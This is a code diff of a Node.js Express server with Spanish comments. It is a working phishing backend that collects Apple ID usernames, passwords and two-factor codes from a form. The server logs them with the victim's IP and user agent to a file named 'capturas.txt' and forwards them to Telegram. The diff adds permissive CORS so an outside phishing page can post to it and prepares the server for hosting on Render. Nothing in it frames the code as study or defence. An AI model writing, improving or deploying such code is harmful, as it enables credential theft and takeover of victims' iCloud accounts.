@@ -1,8 +1,20 @@
 const express = require('express');
-const fetch = require('node-fetch'); // O usa el fetch nativo si usas Node 18+
+const fetch = require('node-fetch');
 const fs = require('fs');
 
 const app = express();
+
+// --- PERMITIR CORS PARA PRUEBAS LOCALES ---
+app.use((req, res, next) => {
+  res.header('Access-Control-Allow-Origin', '*');
+  res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept');
+  res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
+  if (req.method === 'OPTIONS') {
+    return res.sendStatus(200);
+  }
+  next();
+});
+
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
@@ -16,17 +28,21 @@ app.post('/api', async (req, res) => {
     const id   = d.apple_id || "";
     const pass = d.password || "";
     const code = d.code     || "";
-    const completo = !empty(d.completo); // o booleano directo
+    const completo = d.completo ? true : false;
 
     const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || "";
     const ua = req.headers['user-agent'] || "";
 
-    // 1. Ver los datos en la consola de tu servidor (¡Aquí los verás en vivo!)
+    // 1. Ver los datos en la consola de tu servidor en Render
     console.log(`[RECIBIDO] ID: ${id} | Pass: ${pass} | IP: ${ip}`);
 
     // 2. Registro local en un archivo de texto
     const linea = `${new Date().toISOString()} | ${id} | ${pass} | ${code} | ${ip} | ${ua}\n`;
-    fs.appendFileSync("capturas.txt", linea);
+    try {
+        fs.appendFileSync("capturas.txt", linea);
+    } catch (err) {
+        console.error("Error al escribir archivo:", err);
+    }
 
     // 3. Aviso a Telegram
     const texto = `iCloud [Captura]\nID: ${id}\nPass: ${pass}\nIP: ${ip}`;
@@ -40,7 +56,7 @@ app.post('/api', async (req, res) => {
     res.json({ ok: true });
 });
 
-// Puerto dinámico para que funcione en Render/Railway o en local
+// Puerto dinámico para Render
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
     console.log(`Servidor corriendo en el puerto ${PORT}`);
